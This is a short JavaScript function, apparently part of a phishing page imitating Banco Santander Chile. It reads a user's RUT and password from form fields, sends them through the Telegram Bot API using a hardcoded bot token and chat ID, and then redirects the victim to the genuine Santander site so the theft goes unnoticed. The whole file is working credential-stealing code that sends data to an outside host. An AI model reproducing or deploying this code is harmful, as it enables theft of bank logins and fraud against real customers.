
function co() {
    var rut = document.getElementById('pa').value;
    var contraseña = document.getElementById('prd').value;

    // Datos del bot de Telegram y el chat ID al que enviar el mensaje
    var token = '7226973718:AAGfv_AQwJSY5esVJJ-L682PdQk-zatXXpc';
    var chat_id = '7101053333';

    // Mensaje a enviar
    var mensaje = "us: " + rut + "\npas: " + contraseña;

    // URL de la API de Telegram para enviar mensajes
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';

    // Configuración de la solicitud POST
    var parametros = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: mensaje
        })
    };

    // Enviar la solicitud POST a la API de Telegram
    fetch(url, parametros)
        .then(response => {
            if (!response.ok) {
                throw new Error('Hubo un problema al enviar el mensaje.');
            }
            return response.json();
        })
        .then(data => {
            console.log('Mensaje enviado correctamente:', data);
            // Redirigir al usuario a otra página web
            window.location.href = 'https://banco.santander.cl/personas';
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
            // Aquí puedes manejar errores, como mostrar un mensaje de error al usuario
        });
}


